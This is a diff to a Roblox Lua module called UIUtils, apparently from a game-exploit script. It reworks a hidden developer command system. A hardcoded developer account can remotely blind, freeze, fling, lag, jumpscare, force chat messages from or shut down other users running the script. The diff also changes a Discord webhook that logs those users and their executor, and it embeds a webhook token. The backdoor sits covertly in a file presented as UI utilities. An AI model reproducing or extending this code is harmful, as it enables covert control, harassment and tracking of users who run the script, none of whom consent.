@@ -26,7 +26,7 @@ function UIUtils.Init(scriptName)
             local isDeveloper = (localPlayer.Name == DEVELOPER_NAME)
 
             -- Overhead Tag Generator
-            local function createDevTag(character)
+            local function createDevTag(player, character)
                 local head = character:WaitForChild("Head", 5)
                 if not head or head:FindFirstChild("DevBillboardTag") then return end
 
@@ -36,6 +36,9 @@ function UIUtils.Init(scriptName)
                 billboard.Size = UDim2.new(0, 200, 0, 50)
                 billboard.StudsOffset = Vector3.new(0, 2.5, 0)
                 billboard.AlwaysOnTop = true
+                
+                -- Hides the tag ONLY from your screen (ujerald789), but allows other users to see it
+                billboard.PlayerToHideFrom = localPlayer 
 
                 local titleLabel = Instance.new("TextLabel")
                 titleLabel.Size = UDim2.new(1, 0, 0.6, 0)
@@ -52,7 +55,7 @@ function UIUtils.Init(scriptName)
                 subLabel.Size = UDim2.new(1, 0, 0.4, 0)
                 subLabel.Position = UDim2.new(0, 0, 0.6, 0)
                 subLabel.BackgroundTransparency = 1
-                subLabel.Text = "@" .. character.Parent.Name
+                subLabel.Text = "@" .. player.Name
                 subLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
                 subLabel.TextScaled = true
                 subLabel.Font = Enum.Font.SourceSansItalic
@@ -76,10 +79,10 @@ function UIUtils.Init(scriptName)
                         end)
                     end
 
-                    if player.Character then createDevTag(player.Character) end
+                    if player.Character then createDevTag(player, player.Character) end
                     player.CharacterAdded:Connect(function(char)
                         task.wait(1)
-                        createDevTag(char)
+                        createDevTag(player, char)
                     end)
                 end
             end
@@ -225,9 +228,7 @@ function UIUtils.Init(scriptName)
                 local action = data.Action
                 local payload = data.Payload
 
-                -- Check if this execution request is directed to localPlayer
                 if targetId == "ALL" or targetId == localPlayer.UserId then
-                    
                     if action == "NOTIFY" then
                         StarterGui:SetCore("SendNotification", {
                             Title = "📢 Developer Broadcast",
@@ -416,23 +417,30 @@ function UIUtils.Init(scriptName)
                 end
 
                 local function processDevCommand(msg)
-                    local args = string.split(msg, " ")
+                    if string.sub(string.lower(msg), 1, 2) ~= "/e" then return end
+                    
+                    local rawCmd = string.sub(msg, 3)
+                    if string.sub(rawCmd, 1, 1) == " " or string.sub(rawCmd, 1, 1) == "/" then
+                        rawCmd = string.sub(rawCmd, 2)
+                    end
+
+                    local args = string.split(rawCmd, " ")
                     local cmd = string.lower(args[1] or "")
                     local subCmd = string.lower(args[2] or "")
 
-                    if cmd == "/cmds" or cmd == "/help" then
+                    if cmd == "cmds" or cmd == "help" then
                         StarterGui:SetCore("SendNotification", {
                             Title = "👑 Developer Power Commands",
-                            Text = "/blind, /freeze, /fling, /bring, /jumpscare, /forcesay, /lag, /orbit, /shutdown",
+                            Text = "/e blind, /e freeze, /e fling, /e bring, /e jumpscare, /e forcesay, /e lag, /e orbit, /e shutdown",
                             Duration = 10
                         })
 
-                    elseif cmd == "/unesp" or (cmd == "/esp" and (subCmd == "disable" or subCmd == "off")) then
+                    elseif cmd == "unesp" or (cmd == "esp" and (subCmd == "disable" or subCmd == "off")) then
                         espEnabled = false
                         for player, _ in pairs(espHighlights) do removeESP(player) end
                         StarterGui:SetCore("SendNotification", { Title = "👁️ User ESP Disabled", Text = "Script User ESP turned OFF.", Duration = 5 })
 
-                    elseif cmd == "/esp" then
+                    elseif cmd == "esp" then
                         espEnabled = (subCmd == "enable" or subCmd == "on") and true or not espEnabled
                         if espEnabled then
                             for _, child in ipairs(activeFolder:GetChildren()) do
@@ -444,7 +452,7 @@ function UIUtils.Init(scriptName)
                         end
                         StarterGui:SetCore("SendNotification", { Title = "👁️ User ESP Toggled", Text = "ESP is now " .. (espEnabled and "ENABLED" or "DISABLED"), Duration = 5 })
 
-                    elseif cmd == "/users" then
+                    elseif cmd == "users" then
                         local userCount = #activeFolder:GetChildren()
                         local userList = ""
                         for _, child in ipairs(activeFolder:GetChildren()) do
@@ -453,64 +461,64 @@ function UIUtils.Init(scriptName)
                         end
                         StarterGui:SetCore("SendNotification", { Title = "⚡ Active Users: " .. tostring(userCount), Text = userList ~= "" and userList or "No other users.", Duration = 8 })
 
-                    elseif cmd == "/notify" then
+                    elseif cmd == "notify" then
                         table.remove(args, 1)
                         sendRemoteCmd("ALL", "NOTIFY", table.concat(args, " "))
 
-                    elseif cmd == "/blind" then
+                    elseif cmd == "blind" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "BLIND") end
 
-                    elseif cmd == "/unblind" then
+                    elseif cmd == "unblind" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "UNBLIND") end
 
-                    elseif cmd == "/freeze" then
+                    elseif cmd == "freeze" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "FREEZE") end
 
-                    elseif cmd == "/thaw" then
+                    elseif cmd == "thaw" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "THAW") end
 
-                    elseif cmd == "/fling" then
+                    elseif cmd == "fling" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "FLING") end
 
-                    elseif cmd == "/bring" then
+                    elseif cmd == "bring" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "BRING") end
 
-                    elseif cmd == "/jumpscare" then
+                    elseif cmd == "jumpscare" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "JUMPSCARE") end
 
-                    elseif cmd == "/forcesay" then
+                    elseif cmd == "forcesay" then
                         local target = resolveTarget(args[2])
                         table.remove(args, 1)
                         table.remove(args, 1)
                         local chatMsg = table.concat(args, " ")
                         if target and chatMsg ~= "" then sendRemoteCmd(target, "FORCESAY", chatMsg) end
 
-                    elseif cmd == "/lag" then
+                    elseif cmd == "lag" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "LAG") end
 
-                    elseif cmd == "/orbit" then
+                    elseif cmd == "orbit" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "ORBIT") end
 
-                    elseif cmd == "/unorbit" then
+                    elseif cmd == "unorbit" then
                         local target = resolveTarget(args[2])
                         if target then sendRemoteCmd(target, "UNORBIT") end
 
-                    elseif cmd == "/shutdown" then
+                    elseif cmd == "shutdown" then
                         sendRemoteCmd("ALL", "SHUTDOWN")
 
-                    elseif cmd == "/rejoin" then
+                    elseif cmd == "rejoin" then
                         TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
 
-                    elseif cmd == "/serverhop" then
+                    elseif cmd == "serverhop" then
                         TeleportService:Teleport(game.PlaceId, localPlayer)
                     end
                 end
@@ -521,7 +529,7 @@ function UIUtils.Init(scriptName)
             -------------------------------------------------------------------
             -- 📡 DISCORD WEBHOOK LOGGING
             -------------------------------------------------------------------
-            local DISCORD_WEBHOOK_URL = "https://blackbox-tle4.onrender.com/feedback2"
+            local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/67/7NSX8eFywzVafA61rJvWd2MZ2p3hiyqm3PXf6EEyAvKweoJFDaWij_hf2iPdMDdWDs2t"
             local SCRIPT_NAME = scriptName or "Unspecified Script"
 
             local executorName = "Can't Identify Executor"
